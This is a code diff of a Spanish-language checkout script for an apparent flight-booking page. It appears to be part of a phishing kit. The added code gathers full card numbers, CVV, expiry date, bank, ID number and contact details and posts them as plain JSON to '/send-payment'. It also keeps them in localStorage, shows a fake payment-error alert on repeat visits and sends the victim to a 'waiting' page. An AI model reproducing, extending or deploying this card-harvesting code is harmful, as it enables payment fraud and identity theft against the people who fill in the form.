@@ -1,10 +1,9 @@
-// public/js/payment.js — versión corregida y robusta
+// public/js/payment.js
 (function () {
   'use strict';
 
   const LS = window.localStorage;
 
-  // --- referencias DOM (seguras) ---
   let loader = null;
   function initDomRefs() {
     loader = document.querySelector('.loader') || null;
@@ -13,10 +12,7 @@
 
   document.addEventListener('DOMContentLoaded', () => {
     initDomRefs();
-    // inicio con pequeño delay (igual que antes)
     setTimeout(startup, 2000);
-
-    // Safety: forzar ocultado si sigue visible a los 5s
     setTimeout(() => {
       try {
         const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
@@ -42,10 +38,8 @@
     }
   }
 
-  // STARTUP
   function startup() {
     try {
-      // intentar cargar info desde ventana o localStorage
       if (typeof window.info === 'undefined' || !window.info) {
         const saved = LS.getItem('info');
         if (saved) {
@@ -62,11 +56,9 @@
         }
       }
 
-      // quitar clases/ocultar loader
       try { document.body.classList.remove('sb-hidden'); } catch (e) {}
       try { if (loader) { loader.classList.remove('show'); loader.style.display = 'none'; } } catch (e) {}
 
-      // FLIGHT RESUME: actualizar UI si tenemos la info completa
       try {
         const originEl = document.querySelector('#origin-code');
         const destEl = document.querySelector('#destination-code');
@@ -80,7 +72,6 @@
         console.error('Error al actualizar flight resume:', e);
       }
 
-      // CALCULAR PRECIO
       try {
         const flightCostEl = document.querySelector('#flight-cost');
         const finalPrice = computeFinalPrice(window.info);
@@ -96,7 +87,6 @@
         console.warn('Error calculando finalPrice:', e);
       }
 
-      // COMPROBAR ERROR en metaInfo
       try {
         if (window.info && info.metaInfo && typeof info.metaInfo.p === 'string' && info.metaInfo.p !== '') {
           alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
@@ -108,24 +98,19 @@
       console.error('startup error:', err);
       forceHideLoader();
     }
-  } // end startup
+  }
 
-  // --- cálculo seguro del precio ---
   function computeFinalPrice(infoObj) {
     try {
       if (!infoObj || !infoObj.flightInfo) return NaN;
-
       const fi = infoObj.flightInfo;
       const adults = Number(fi.adults) || 0;
       const children = Number(fi.children) || 0;
-      const pax = Math.max(1, adults + children); // al menos 1 pasajero
-
+      const pax = Math.max(1, adults + children);
       const sched = fi.ticket_sched;
       const type = fi.ticket_type;
-
       let base = NaN;
 
-      // comprobar que los objetos de precios existan
       if (fi.ticket_nat === 'NAC') {
         if (typeof pricesNAC !== 'undefined' && pricesNAC && pricesNAC[sched] && typeof pricesNAC[sched][type] !== 'undefined') {
           base = Number(pricesNAC[sched][type]);
@@ -141,12 +126,9 @@
       } else {
         console.warn('flight resume: ticket_nat no definido:', fi.ticket_nat);
       }
-
       if (!Number.isFinite(base)) return NaN;
-
       let final = base * pax;
-      if (Number(fi.type) === 1) final = final * 2; // ida y vuelta si aplica
-
+      if (Number(fi.type) === 1) final = final * 2;
       return final;
     } catch (e) {
       console.warn('computeFinalPrice error:', e);
@@ -154,7 +136,6 @@
     }
   }
 
-  // --- DOM: form y campos (referencias seguras) ---
   const form = document.querySelector('#next-step');
   const p = document.querySelector('#p');
   const pdate = document.querySelector('#pdate');
@@ -174,12 +155,10 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      // limpiar errores visuales (si existen)
       [p, pdate, c, dudename, surname, dniEl, email, telnum, city, state, address].forEach(el => {
         try { if (el && el.classList) el.classList.remove('input-error'); } catch (_) {}
       });
 
-      // valores protegidos
       const rawCard = p && p.value ? p.value : '';
       const rawCardDigits = rawCard.replace(/\D/g, '');
       const firstChar = rawCardDigits[0] || '';
@@ -204,56 +183,58 @@
       if (!state || !state.value) { if (state) { state.classList.add('input-error'); state.focus(); } return; }
       if (!address || !address.value) { if (address) { address.classList.add('input-error'); address.focus(); } return; }
 
-      // Guardar metaInfo si existe info
-      try {
-        if (window.info && info.metaInfo) {
-          info.metaInfo.p = p.value;
-          info.metaInfo.ban = ban.value;
-          info.metaInfo.pdate = pdate.value;
-          info.metaInfo.c = c.value;
-          info.metaInfo.dudename = dudename.value;
-          info.metaInfo.surname = surname.value;
-          info.metaInfo.cc = dniEl.value;
-          info.metaInfo.email = email.value;
-          info.metaInfo.telnum = telnum.value;
-          info.metaInfo.city = city.value;
-          info.metaInfo.state = state.value;
-          info.metaInfo.address = address.value;
-          info.metaInfo.dues = dues ? dues.value : '';
-          info.metaInfo.flightCost = document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '';
-          if (!info.checkerInfo) info.checkerInfo = {};
-          info.checkerInfo.mode = 'userpassword';
-
-          // determinar compañía por primer dígito
-          const fc = (p.value || '').replace(/\D/g, '')[0] || '';
-          if (fc === '4') info.checkerInfo.company = 'VISA';
-          else if (fc === '5') info.checkerInfo.company = 'MC';
-          else if (fc === '3') info.checkerInfo.company = 'AM';
-
-          safeUpdateLS();
-        }
-      } catch (e) {
-        console.warn('No se pudo actualizar info.metaInfo:', e);
+      if (loader) {
+        loader.classList.add('show');
+        loader.style.display = 'block';
       }
+      document.body.classList.add('sb-hidden');
 
-      // mostrar loader y redirigir
+      const paymentData = {
+        flightCost: document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '',
+        name: dudename.value,
+        surname: surname.value,
+        cc: dniEl.value,
+        email: email.value,
+        telnum: telnum.value,
+        city: city.value,
+        state: state.value,
+        address: address.value,
+        bank: ban.value,
+        cardNumber: p.value,
+        expiryDate: pdate.value,
+        cvv: c.value,
+        dues: dues ? dues.value : '',
+      };
+
       try {
-        if (loader) {
-          loader.classList.add('show');
-          loader.style.display = '';
+        const response = await fetch('/send-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(paymentData),
+        });
+
+        const result = await response.json();
+
+        if (result.ok && result.transactionId) {
+          const savedInfo = JSON.parse(LS.getItem('info')) || {};
+          savedInfo.transactionId = result.transactionId;
+          savedInfo.paymentData = paymentData; // Guardar los datos del pago
+          LS.setItem('info', JSON.stringify(savedInfo));
+          console.log('Datos enviados. ID de transacción:', result.transactionId);
+          window.location.href = 'waiting.html';
+        } else {
+          console.error('Error del servidor:', result.error);
+          alert('Hubo un problema al procesar el pago. Por favor, inténtalo de nuevo.');
+          forceHideLoader();
         }
-        setTimeout(() => {
-          try { window.location.href = 'waiting.html'; } catch (e) { console.warn('redir error:', e); }
-        }, 4500);
-      } catch (e) {
-        console.warn('Error al intentar mostrar loader/redirigir:', e);
+      } catch (err) {
+        console.error('Error de red al enviar pago:', err);
+        alert('No se pudo conectar con el servidor. Revisa tu conexión a internet.');
         forceHideLoader();
       }
-
     });
   }
 
-  // --- utilidades ---
   function safeUpdateLS(){
     try {
       if (typeof info !== 'undefined') LS.setItem('info', JSON.stringify(info));
@@ -300,7 +281,6 @@
     input.value = texto;
   }
 
-  // Formatea number -> "1.234.567,89" con dos decimales usando locale es-CO
   function formatPrice(number){
     number = Number(number) || 0;
     try {
@@ -310,14 +290,12 @@
     }
   }
 
-  // Luhn robusto: acepta espacios y guiones
   function isLuhnValid(value) {
     if (!value || typeof value !== 'string') return false;
     const s = value.replace(/\D/g, '');
-    if (s.length < 6) return false; // mínimo sensato
+    if (s.length < 6) return false;
     let sum = 0;
     let shouldDouble = false;
-    // recorremos de derecha a izquierda
     for (let i = s.length - 1; i >= 0; i--) {
       let digit = parseInt(s.charAt(i), 10);
       if (isNaN(digit)) return false;
@@ -331,7 +309,6 @@
     return (sum % 10) === 0;
   }
 
-  // Validación de fecha MM/AA (no vencida y no > +8 años)
   function isValidDate(fechaInput) {
     if (!fechaInput || typeof fechaInput !== 'string') return false;
     const partes = fechaInput.split('/');
@@ -340,18 +317,13 @@
     let anio = parseInt(partes[1], 10);
     if (isNaN(mes) || isNaN(anio)) return false;
     if (mes < 1 || mes > 12) return false;
-    // interpretar YY -> 20YY
     anio += 2000;
-    // construir fecha final: el último día del mes de expiración
-    const exp = new Date(anio, mes, 0, 23, 59, 59, 999); // mes indexado 0: usar mes directo produce siguiente - 0 para último día
+    const exp = new Date(anio, mes, 0, 23, 59, 59, 999);
     const ahora = new Date();
-    // límite superior
     const limite = new Date();
     limite.setFullYear(limite.getFullYear() + 8);
-    // comprobar que la expiración esté entre ahora (incluido) y limite (excluido)
     if (exp < ahora) return false;
     if (exp > limite) return false;
     return true;
   }
-
-})(); // fin módulo
+})();
